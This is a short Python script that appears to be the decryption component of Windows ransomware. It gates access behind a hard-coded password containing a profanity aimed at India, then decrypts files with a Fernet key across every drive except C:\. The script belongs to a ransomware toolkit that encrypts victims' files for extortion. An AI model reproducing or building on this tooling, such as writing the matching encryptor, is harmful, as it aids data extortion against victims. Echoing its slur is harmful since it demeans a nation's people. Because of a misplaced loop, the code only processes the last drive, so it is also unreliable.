import os
from cryptography.fernet import Fernet, InvalidToken
from win32api import GetLogicalDriveStrings
from threading import Thread


while True:
    if(input("Please enter the password:" ) == "141fuckindia141"):
        break
    print("Password was not correct")

KEY = input("Enter key to unlock files: ")
 
fernet = Fernet(KEY)

def decript(file):
    try:
        with open (file,'rb') as myFile:
            myFileData = myFile.read()
        decriptedMyFileData = fernet.decrypt(myFileData)

        with open(file,'wb') as myFile:
    
            myFile.write(decriptedMyFileData)
    except InvalidToken:
        print("please enter correct key")
        exit()
    except Exception as e:
        print(e)
drivees = GetLogicalDriveStrings().split("\x00")
drivees.pop()
def run():
    for drive in drivees:
     if ( drive == "C:\\" ):
        continue
    for root, folder, files in os.walk(drive):
        for file in files:
            decript(os.path.join(root,file))
Thread(target=run).start()